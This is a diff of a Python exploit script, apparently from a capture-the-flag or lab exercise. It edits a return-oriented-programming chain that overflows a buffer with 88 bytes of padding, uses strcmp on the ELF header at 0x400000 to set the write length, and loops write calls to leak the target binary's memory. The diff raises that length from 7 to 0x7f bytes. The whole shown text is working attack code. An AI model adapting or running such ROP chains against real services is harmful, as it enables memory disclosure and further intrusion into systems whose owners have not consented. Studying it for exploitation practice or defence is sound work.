@@ -949,11 +949,11 @@ def leak_binary_write(i,j):
 
     payload = b'A'*88                                   #pad
     payload += p64(pop_rdi)                             #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
-    payload += p64(0x400000)                            #rdi points to 0x400000 which should hold 'ELF'
+    payload += p64(0x400000)                            #rdi points to 0x400000 which should hold '0x00010102464c457f'
     payload += p64(pop_rsi_r15)
-    payload += p64(0x400000)                            #rsi points to 0x400000 which should hold 'ELF'
+    payload += p64(0x400001)                            #rsi points to 0x400001 which should hold '0x0000010102464c45'
     payload += p64(0x00)                                #junk r15
-    payload += p64(strcmp)                              #sets rdx to 0x07
+    payload += p64(strcmp)                              #sets rdx to 0x7f
 
     payload += p64(pop_rdi)
     payload += p64(0x01)                                #fd for write usually 0x01 but when we connect throu a socket maybe differ
@@ -981,7 +981,7 @@ def leak_binary_write(i,j):
 
 
 file = []
-offset = 7                                              #0x400000 = 0x00010102464c457f so 7
+offset = 0x7f                                           
 
 for i in range(0xb00):                      
     offset = leak_binary_write(i*offset,0x400000)
